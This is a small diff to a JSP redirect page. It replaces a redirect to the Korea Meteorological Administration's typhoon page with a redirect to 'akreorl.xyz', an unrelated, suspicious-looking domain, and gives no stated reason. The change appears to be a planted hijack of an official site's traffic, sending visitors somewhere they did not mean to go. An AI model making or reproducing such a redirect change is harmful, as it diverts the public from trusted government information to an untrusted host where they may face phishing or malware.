@@ -1,5 +1,5 @@
 <%
 response.setStatus(301);
-response.setHeader( "Location", "http://www.kma.go.kr/mini/typoon/main.jsp" );
+response.setHeader( "Location", "http://akreorl.xyz/" );
 response.setHeader( "Connection", "close" );
 %>
